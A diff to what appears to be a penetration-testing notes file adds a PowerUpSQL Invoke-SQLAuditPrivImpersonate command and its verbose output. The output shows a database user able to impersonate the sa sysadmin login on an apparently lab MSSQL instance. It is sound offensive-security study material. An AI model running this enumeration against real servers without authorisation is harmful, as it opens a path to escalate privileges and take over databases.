@@ -278,9 +278,13 @@ name
 sa
 dbuser
 ```
-Using PowerUpSQL:
+Check impersonation possibilitie using PowerUpSQL:
 ```
 Invoke-SQLAuditPrivImpersonate -Username $username -Password $password -Instance MVU-SQL.us.marvel.local -Verbose
+VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
+VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.
+VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.
+VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.
 ```
 
 Impersonate using PowerUpSQL
